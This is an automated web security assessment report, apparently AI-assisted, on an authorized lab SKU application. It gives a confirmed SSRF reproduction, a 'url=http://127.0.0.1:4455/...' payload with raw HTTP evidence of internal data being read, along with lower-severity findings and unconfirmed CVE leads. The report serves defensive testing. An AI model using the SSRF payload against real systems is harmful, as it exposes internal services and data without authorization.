# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — ssrf Unauthenticated SSRF in /sku_url.php url parameter — reads internal-only service on 127.0.0.1:4455](#finding-1)
    - [2. MEDIUM — info-disclosure Session ID exposed in HTML response body](#finding-2)
    - [3. LOW — headers Missing HTTP security headers across all responses](#finding-3)
    - [4. INFO — info-disclosure Technology version disclosure in HTTP response headers and body](#finding-4)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [5. CRITICAL — vulnerable-component Outdated Apache httpd 2.4.56 — CVE-2024-38475 (mod_rewrite)](#finding-5)
    - [6. HIGH — vulnerable-component Apache 2.4.56 — multiple known High/Critical CVEs in later releases (CVE-2024-38474, CVE-2024-39573)](#finding-6)
    - [7. HIGH — vulnerable-component End-of-life PHP 8.0.30 — unsupported, unpatched (EOL 2023-11-26)](#finding-7)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr2usiqr-9pdy8x` |
| Target | http://target.local:8081/ |
| Started | 2026-07-02T01:56:24.919Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 13 mapped · 13 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:8081`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 1 high, 1 medium, 1 low, 1 info

_Plus 3 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [ssrf] Unauthenticated SSRF in /sku_url.php url parameter — reads internal-only service on 127.0.0.1:4455

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8081/

The unauthenticated form at /sku_url.php fetches an operator-supplied URL server-side and renders the response body inline ("Fetched SKU Model"). By supplying url=http://127.0.0.1:4455/ an external attacker makes the server request an internal-only service (the "SKU model API" bound to loopback, not reachable from outside) and receives its full response. The internal service documents further endpoints which are also retrievable: /sku_transfer returns internal inventory JSON ({"sku":"TRF123","description":"Transferred Item 1","quantity":9},...) and /sku_validation returns validation JSON. A port allow-list restricts fetches to port 4455 (file:// and other ports return "Invalid port. Only connections to port 4455 are allowed"), which limits file-read/LFI but does NOT prevent reaching internal HTTP services on that port. Impact: unauthenticated read access to loopback/internal microservices and their data.

**Reproduction**

```
POST http://target.local:8081/sku_url.php with Content-Type: application/x-www-form-urlencoded and body `url=http://127.0.0.1:4455/`. Response inlines the internal service banner "SKU Model Service is running on port 4455 ... BETA Documentation" under a "Fetched SKU Model" heading. Compare to negative control `url=` (empty) which returns no fetched content. Deeper impact: `url=http://127.0.0.1:4455/sku_transfer` and `url=http://127.0.0.1:4455/sku_validation` return internal JSON datasets.
```

**Evidence**

- Evidence `ev-mr2w1qb5-3d` — `artifacts/s-0005/ev-mr2w1qb5-3d/`

Request:

```http
POST /sku_url.php HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

url=
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 455
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:31:33 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>SKU Model</title>
</head>
<body>
    <h1>SKU Model</h1>
    
    <form method="post" action="">
        <label for="url">Enter URL:</label>
        <input type="text" id="url" name="url" value="" size="100">
        <input type="submit" value="Fetch SKU Model">
    </form>
    <p>Your IP address: target.local</p>
    <p>SKU model API: 127.0.0.1:4455</p>
<p><a href="index.php">Back</a></p>
    

</body>
</html>
```

- Evidence `ev-mr2w11js-3c` — `artifacts/s-0005/ev-mr2w11js-3c/`

Request:

```http
POST /sku_url.php HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

url=http://127.0.0.1:4455/
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1141
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:31:01 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>SKU Model</title>
</head>
<body>
    <h1>SKU Model</h1>
    
    <form method="post" action="">
        <label for="url">Enter URL:</label>
        <input type="text" id="url" name="url" value="http://127.0.0.1:4455/" size="100">
        <input type="submit" value="Fetch SKU Model">
    </form>
    <p>Your IP address: target.local</p>
    <p>SKU model API: 127.0.0.1:4455</p>
<p><a href="index.php">Back</a></p>
            <h2>Fetched SKU Model</h2>
        <div>
            SKU Model Service is running on port 4455. <br/><br/>Sku Service Remote Function - BETA Documentation.<br/><br/><strong>Transfer</strong> - Allow you to view transfer between SKU<br/><ul><li>http://127.0.0.1:4455/sku_transfer</li></ul><strong>Validate</strong> - Allow you to validate a SKU number<br/><ul><li>http://127.0.0.1:4455/sku_validation</li></ul><strong>Process</strong> - Allow you to upload and process an SKU number with a valid blob data<br/><li>Method: POST</li><li>Parameters:  data JPG file of the SKU number. </li><ul><li>http://127.0.0.1:4455/sku_process</li></ul>
        </div>
    

</body>
</html>
```

- Evidence `ev-mr2w1rf9-3e` — `artifacts/s-0005/ev-mr2w1rf9-3e/`

Request:

```http
POST /sku_url.php HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded

url=http://127.0.0.1:4455/
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1141
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:31:35 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30

<!DOCTYPE html>
<html>
<head>
    <title>SKU Model</title>
</head>
<body>
    <h1>SKU Model</h1>
    
    <form method="post" action="">
        <label for="url">Enter URL:</label>
        <input type="text" id="url" name="url" value="http://127.0.0.1:4455/" size="100">
        <input type="submit" value="Fetch SKU Model">
    </form>
    <p>Your IP address: target.local</p>
    <p>SKU model API: 127.0.0.1:4455</p>
<p><a href="index.php">Back</a></p>
            <h2>Fetched SKU Model</h2>
        <div>
            SKU Model Service is running on port 4455. <br/><br/>Sku Service Remote Function - BETA Documentation.<br/><br/><strong>Transfer</strong> - Allow you to view transfer between SKU<br/><ul><li>http://127.0.0.1:4455/sku_transfer</li></ul><strong>Validate</strong> - Allow you to validate a SKU number<br/><ul><li>http://127.0.0.1:4455/sku_validation</li></ul><strong>Process</strong> - Allow you to upload and process an SKU number with a valid blob data<br/><li>Method: POST</li><li>Parameters:  data JPG file of the SKU number. </li><ul><li>http://127.0.0.1:4455/sku_process</li></ul>
        </div>
    

</body>
</html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [info-disclosure] Session ID exposed in HTML response body

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8081/

The root page renders a freshly generated session ID in plaintext inside the HTML response body on every request: "Hello, your temporally session id is &lt;32-char hex&gt;". Each request produces a unique token, confirming the server generates and then immediately exposes a session identifier in the page body. This token may be harvested by CDN/proxy logs, browser history, Referer headers, or any intermediary that captures response bodies.

**Reproduction**

```
1. GET http://target.local:8081/ (no auth required)
2. Observe the first line of the response body: "Hello, your temporally session id is &lt;32-char hex&gt;"
3. Repeat — a fresh hex token appears on every request.
Negative control: GET /nonexistent_control_path.html returns a standard 404 with no session ID (ev-mr2v2gzy-6).
```

**Evidence**

- Evidence `ev-mr2v2gzy-6` — `artifacts/s-0001/ev-mr2v2gzy-6/`

Request:

```http
GET /nonexistent_control_path.html HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 278
content-type: text/html; charset=iso-8859-1
date: Thu, 02 Jul 2026 02:04:08 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.56 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.56 (Debian) Server at target.local Port 8081</address>
</body></html>
```

- Evidence `ev-mr2v1goj-3` — `artifacts/s-0001/ev-mr2v1goj-3/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:03:21 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is d2fbeb78c9f34f0154b0c70cc273b2ae
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```

- Evidence `ev-mr2v2gbw-5` — `artifacts/s-0001/ev-mr2v2gbw-5/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:04:07 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is 65c41e846c851cdd2e361760a7060edd
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [headers] Missing HTTP security headers across all responses

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8081/

All application responses return only `Content-Type`. No security-relevant headers are set: absent are Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and (for HTTPS) Strict-Transport-Security. The absence of X-Frame-Options and CSP frame-ancestors leaves the app vulnerable to clickjacking. The absence of X-Content-Type-Options enables MIME sniffing attacks.

**Reproduction**

```
1. GET http://target.local:8081/ — response headers: {"content-type":"text/html; charset=UTF-8"} only
2. Confirmed across two separate requests (ev-mr2v1goj-3, ev-mr2v2gbw-5) and error pages (ev-mr2v2gzy-6)
3. Missing: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
```

**Evidence**

- Evidence `ev-mr2v2gzy-6` — `artifacts/s-0001/ev-mr2v2gzy-6/`

Request:

```http
GET /nonexistent_control_path.html HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 278
content-type: text/html; charset=iso-8859-1
date: Thu, 02 Jul 2026 02:04:08 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.56 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.56 (Debian) Server at target.local Port 8081</address>
</body></html>
```

- Evidence `ev-mr2v1goj-3` — `artifacts/s-0001/ev-mr2v1goj-3/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:03:21 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is d2fbeb78c9f34f0154b0c70cc273b2ae
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```

- Evidence `ev-mr2v2gbw-5` — `artifacts/s-0001/ev-mr2v2gbw-5/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:04:07 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is 65c41e846c851cdd2e361760a7060edd
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [INFO] [info-disclosure] Technology version disclosure in HTTP response headers and body

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8081/

Server responses disclose precise technology versions on every request: (1) `Server: Apache/2.4.56 (Debian)` response header, (2) `X-Powered-By: PHP/8.0.30` response header, and (3) the HTML body renders `Twig version: 3.10.3`. This gives an attacker an exact component fingerprint without any probing.

**Reproduction**

```
1. GET http://target.local:8081/
2. Inspect response headers: Server: Apache/2.4.56 (Debian), X-Powered-By: PHP/8.0.30
3. Inspect response body: &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
4. Also visible in Apache error pages (ev-mr2v2gzy-6): "Apache/2.4.56 (Debian) Server at ... Port 8081"
```

**Evidence**

- Evidence `ev-mr2v2gzy-6` — `artifacts/s-0001/ev-mr2v2gzy-6/`

Request:

```http
GET /nonexistent_control_path.html HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 278
content-type: text/html; charset=iso-8859-1
date: Thu, 02 Jul 2026 02:04:08 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.56 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.56 (Debian) Server at target.local Port 8081</address>
</body></html>
```

- Evidence `ev-mr2v1goj-3` — `artifacts/s-0001/ev-mr2v1goj-3/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:03:21 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is d2fbeb78c9f34f0154b0c70cc273b2ae
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```

- Evidence `ev-mr2v2gbw-5` — `artifacts/s-0001/ev-mr2v2gbw-5/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:04:07 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is 65c41e846c851cdd2e361760a7060edd
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-5"></a>

### 5. [SUSPECTED] [CRITICAL] [vulnerable-component] Outdated Apache httpd 2.4.56 — CVE-2024-38475 (mod_rewrite)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8081/

**Anomaly (why this is a lead):** Apache/2.4.56 (Debian) detected via the Server response header on every page. It predates the entire 2.4.57→2.4.6x security train; most serious applicable issue is CVE-2024-38475 (mod_rewrite improper escaping of output, CVSS 9.1, affects <=2.4.59) → unauthorized filesystem access / source disclosure / SSRF, an exploitable class. Also CVE-2024-40725 (CGI source disclosure). Version-based, not yet exploited — confirmation depends on the site's specific RewriteRule config.

Server banner "Apache/2.4.56 (Debian)" (seen unauthenticated on / and /index.php). Apache 2.4.56 is missing all fixes from 2.4.57 onward. Primary lead: CVE-2024-38475 — improper escaping of output in mod_rewrite (fixed in 2.4.60, affects <=2.4.59), critical (9.1); depending on RewriteRule substitutions it enables serving files from unintended locations → source code disclosure and, in some configurations, SSRF/code execution. Related July-2024 batch: CVE-2024-40725 (partial CGI source disclosure), CVE-2024-38474/38473 (mod_rewrite/mod_proxy encoding). DoS-class issues (CVE-2024-27316 HTTP/2 CONTINUATION flood) noted but excluded as non-exploitable-class. Version-based match — not actively confirmed; a real exploit requires the app's specific mod_rewrite configuration. Remediation: upgrade to the current 2.4.x.

[+] Also observed as "End-of-life PHP 8.0.30 — unsupported, unpatched (EOL 2023-11-26)".

**Reproduction**

```
GET http://target.local:8081/ and read the Server response header → "Apache/2.4.56 (Debian)". Cross-reference against CVE-2024-38475 (fixed in Apache httpd 2.4.60). Active confirmation would require probing the deployed RewriteRules for the mod_rewrite output-escaping flaw; not performed (no generic non-destructive PoC without knowledge of the ruleset).
```

**Evidence**

- Evidence `ev-mr2y89a8-8s` — `artifacts/_/ev-mr2y89a8-8s/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 03:32:37 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is 38550f75507f83307d2e329454f242e1
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```

<a id="finding-6"></a>

### 6. [SUSPECTED] [HIGH] [vulnerable-component] Apache 2.4.56 — multiple known High/Critical CVEs in later releases (CVE-2024-38474, CVE-2024-39573)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8081/

**Anomaly (why this is a lead):** Apache 2.4.56 detected; CVE-2024-38474 (mod_rewrite substitution encoding, allows script execution — RCE-class, affects 2.4.0–2.4.61) and CVE-2024-39573 (mod_rewrite proxy handler injection, affects 2.4.0–2.4.61) were fixed in Apache 2.4.62 (July 2024). This installation predates the fix by over a year and is unpatched against these High/Critical issues if mod_rewrite is active.

The server identifies as Apache/2.4.56 (Debian). Apache 2.4.62 (July 2024) patched CVE-2024-38474 (mod_rewrite substitution encoding bypass — allows executing scripts in directories permitted for scripts but not CGI; effectively RCE-class via mod_rewrite) and CVE-2024-39573 (mod_rewrite proxy handler substitution injection). Both affect all 2.4.x versions through 2.4.61. Apache 2.4.56 is within the affected range. Upgrade to 2.4.62+ is required.

**Reproduction**

```
1. GET http://target.local:8081/ — Server header: Apache/2.4.56 (Debian)
2. Confirmed by fingerprint_scan (ev-mr2v0po3-2)
3. CVE-2024-38474 and CVE-2024-39573: fixed in Apache 2.4.62 (2024-07-17); 2.4.56 predates fix
4. Verify by inspecting mod_rewrite configuration and testing for substitution-encoding bypass in relevant RewriteRule paths
```

**Evidence**

- Evidence `ev-mr2v0po3-2` — `artifacts/s-0001/ev-mr2v0po3-2/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 02:02:46 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is cd73f3b6e30de4b4e1d75cf3323b6b02
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```

<a id="finding-7"></a>

### 7. [SUSPECTED] [HIGH] [vulnerable-component] End-of-life PHP 8.0.30 — unsupported, unpatched (EOL 2023-11-26)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:8081/

**Anomaly (why this is a lead):** PHP/8.0.30 detected via the X-Powered-By response header. 8.0.30 is the final 8.0 release; the 8.0 branch reached end-of-life on 2023-11-26 and receives NO security patches. Any PHP-8.0-affecting vulnerability disclosed since then is permanently unpatched on this host. Note: the headline post-EOL critical CVE-2024-4577 (9.8 CGI arg-injection RCE) is Windows-CGI-specific and does NOT apply to this Debian/mod_php target; applicable Linux CVEs (CVE-2024-8927, CVE-2024-8925) are moderate. Version/EOL-based, not actively confirmed.

X-Powered-By banner "PHP/8.0.30" (seen unauthenticated on /). PHP 8.0 reached end-of-life on 2023-11-26 — no further security releases. Operational risk is high: the interpreter is internet-reachable and will never receive fixes for future 8.0-affecting CVEs. Honest scoping of currently-known issues: CVE-2024-4577 (critical CGI-arg-injection RCE) is Windows-CGI-only and NOT applicable to a Debian mod_php deployment; the earlier phar-OOB RCE CVE-2023-3824 was already fixed in 8.0.30. Remaining post-EOL CVEs applicable to Linux (CVE-2024-8927 cookie-header $_GET bypass, CVE-2024-8925 multipart parsing) are moderate. This is a version/EOL-based lead, not an actively-confirmed exploit. Remediation: upgrade to a supported PHP branch (8.2+).

**Reproduction**

```
GET http://target.local:8081/ and read the X-Powered-By response header → "PHP/8.0.30". Cross-reference release history: 8.0.30 (2023-08-03) is the last 8.0 release; branch EOL 2023-11-26. No safe active PoC applies (the notable critical CVE-2024-4577 requires the Windows CGI SAPI, absent here); classified suspected/version-based.
```

**Evidence**

- Evidence `ev-mr2y89a8-8s` — `artifacts/_/ev-mr2y89a8-8s/`

Request:

```http
GET / HTTP/1.1
Host: target.local:8081
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 587
content-type: text/html; charset=UTF-8
date: Thu, 02 Jul 2026 03:32:37 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.56 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/8.0.30


Hello, your temporally session id is 38550f75507f83307d2e329454f242e1
<!DOCTYPE html>
<html>
<head>
    <title>Hello</title>
</head>
<body>
    <h1>Welcome to the SKU product system !</h1>
    <p>Profile: anonymous</p>
    <p>Sandbox mode: Enabled</p>
    <p>Twig version: 3.10.3</p>
    
    <h2>SKU Management</h2>
    <ul>
        <li><a href="sku_system.php">View SKU List</a></li>
        <li><a href="sku_search.php">Search SKU</a></li>
        <li><a href="sku_add.php">Add SKU</a></li>
        <li><a href="sku_url.php">Process your SKU model</a></li>
    </ul>
</body>
</html>
```
